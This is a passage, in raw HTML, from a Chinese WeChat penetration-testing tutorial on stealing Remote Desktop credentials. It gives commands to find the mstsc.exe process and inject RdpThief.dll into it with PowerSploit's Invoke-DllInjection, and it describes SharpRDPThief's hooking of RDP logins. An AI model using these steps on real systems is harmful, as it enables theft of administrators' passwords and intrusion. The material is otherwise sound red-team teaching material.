4px;">rdpthief_dump</code>&nbsp;即可成功显示抓取到的结果:</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5941520467836258" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/27_cB6MD2rj14HYL8vibbn9Kq0k8Y1LVQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPIaKzmd3zWWBdXHEaDBQhkcrHeicB6MD2rj14HYL8vibbn9Kq0k8Y1LVQ/640?wx_fmt=png'" data-type="png" data-w="855" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713200126719</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">抓出来的凭据存储在&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">%temp%\data.bin</code>&nbsp;目录下</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5461783439490446" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/28_YPPDN6V1whs9anA0vhQNVwfI0yDf8g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPhHM2tpicyxzCeua89vP8iahtJqYPPDN6V1whs9anA0vhQNVwfI0yDf8g/640?wx_fmt=png'" data-type="png" data-w="1256" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713204623446</figcaption></figure><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">直接注入 RdpThief.dll</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先需要使用 Visual Studio 导入 RdpThief 的工程文件，编译生成 RdpThief.dll。然后查看正在运行的 mstsc.exe 进程：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tasklist </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">v </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> findstr  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"mstsc"</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.08069164265129683" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/29_MvKNk9sNM5wb49NXzDvicld3m8lZ2Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPpH7F99iaf8tHnVAsC9muFOJ4l8MvKNk9sNM5wb49NXzDvicld3m8lZ2Q/640?wx_fmt=png'" data-type="png" data-w="1388" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713221939175</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">得到 mstsc.exe 进程的 PID 为 1204。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后使用 PowerSploit 中的 Invoke-DllInjection.ps1 脚本将 RdpThief.dll 注入到 mstsc.exe 进程中去即可：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="powershell" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Invoke</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DllInjection</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Invoke</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DllInjection</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ProcessID</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1204</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Dll</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">RdpThief</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dll</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">当管理员使用远程桌面并输入密码时便会抓取到 RDP 凭据并保存到&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">%temp%\data.bin</code>&nbsp;中。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">我在测试的时候发现该工具有两个条件，即目标主机上必须存在 mstsc.exe 进程，而且必须是管理员手动输入凭据，如果管理员直接保存了凭据的话是抓不到的。</p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">使用 SharpRDPThief 实现 HOOK RDP 凭据</h2><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/30_QwNkXOTmM7qPGu8D8Ch6m6TsKyyqVQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPFvPiahGnBGIl3vboZr1T4beenQwNkXOTmM7qPGu8D8Ch6m6TsKyyqVQ/640?wx_fmt=png'" data-type="png" data-w="1200" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>项目地址：https://github.com/passthehashbrowns/SharpRDPThief</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">SharpRDPThief 工具是 Josh Magri 用 C# 重写对 RdpThief 的重写。然而，与 RdpThief 相比，SharpRDPThief 使用 IPC Server 可以使用接收来自 mstsc.exe 进程中抓取到的凭据。如果 mstsc.exe 被终止，Server 也会继续运行，并且等待 mstsc.exe 进程再次重新启动时会尝试再次进行 Hooking。这解决了 RdpThief 要求进程已经存在的限制。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如下，直接运行 SharpRDPThief.exe，然后模拟管理员使用远程桌面登录某台服务器，输入密码后 SharpRDPThief 成功抓取到了 RDP 登录凭据：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5182529335071708" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/31_hvm1IWPCJ1uEiaA6FqZicKRv0WgS1g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPdBJCAwuTrW3XicSlN1yh18auvEghvm1IWPCJ1uEiaA6FqZicKRv0WgS1g/640?wx_fmt=png'" data-type="png" data-w="1534" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713210234268</figcaption></figure><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">Ending......</h2><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6675" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/32_2pWvtnN395e7IWz2uky6mYNI0T6Yag.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPWGM0fpdExldOVoPocH27oicnb2pWvtnN395e7IWz2uky6mYNI0T6Yag/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1200" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="white-space: normal;"><img data-ratio="0.109375" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/33_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-w="640" style="height: auto !important;"  /><br  /></p><p style="white-space: normal;"><br  /></p><p style="white-space: normal;text-align: center;"><strong>推荐阅读</strong></p><p style="white-space: normal;text-align: center;"><br  /></p><p style="white-space: normal;text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247498288&amp;idx=1&amp;sn=851640e1e271c348c195bdb7400d62cc&amp;chksm=ec1caf0fdb6b261935f92e8e3458ac01ef27f323668098bc12edb462db60fd9c1c27217a8e21&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">内网渗透 | 横向移动中MSTSC的密码获取</a><br  /></p><p style="white-space: normal;text-align: center;"><br  /></p><p style="white-space: normal;text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497831&amp;idx=1&amp;sn=cdc3aef06751705f8156f35115f6892d&amp;chksm=ec1cad58db6b244e5174b026c9699cf70066ac919ee2213c69742e74bd990be224feee996c03&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">内网渗透 | SPN 与 Kerberoast 攻击讲解</a><br  /></p><p style="white-space: normal;text-align: center;"><br  /></p><p style="white-space: normal;text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497830&amp;idx=1&amp;sn=9dfacfb1a9513c860a3aeb268770097e&amp;chksm=ec1cad59db6b244f05d44dc179ee9969acea9b0371c653992d9a65a80ae235cfa812186316db&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">内网渗透 | Kerberos 协议相关安全问题分析与利用</a><br  /></p><p style="white-space: normal;text-align: center;"><br  /></p><p style="white-space: normal;text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497760&amp;idx=1&amp;sn=4c0f57ba9203cc115a85cd0c011fdc43&amp;chksm=ec1cad1fdb6b2409ec3ef25008ad6834a7220997a914308a478ed9d682c84c7b370e423a878c&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">内网渗透 | Kerberos 协议与 Kerberos 认证原理</a><br  /></p><p style="white-space: normal;text-align: center;"><br  /></p><p style="white-space: normal;text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497259&amp;idx=1&amp;sn=9974fef13efd9dfc08a9107750e51fc6&amp;chksm=ec1ca314db6b2a02866ba22cf32ef48cf4a04f7a112699d8924de4bb51d19cae85680f04ec3d&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">内网渗透 | 利用拷贝卷影提取ntds.dit</a><br  /></p><p style="white-space: normal;text-align: center;"><br  /></p><p style="white-space: normal;text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247498826&amp;idx=1&amp;sn=0ea380bf43e25f5a4e8ad4c20451226a&amp;chksm=ec1ca975db6b2063cc5b9191f3841cdc1f7e57088169932ee4e61e55f046737cee76a648da76&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">内网渗透｜基于文件传输的 RDP 反向攻击</a><br  /></p><p style="white-space: normal;text-align: center;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__832" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(255, 104, 39)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)|rgb(255, 104, 39)" style="font-size:15px;line-height:35px;;color: rgb(255, 104, 39);">本月报名可以参加抽奖送BADUSB的优惠活动</span><br data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__834" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)"  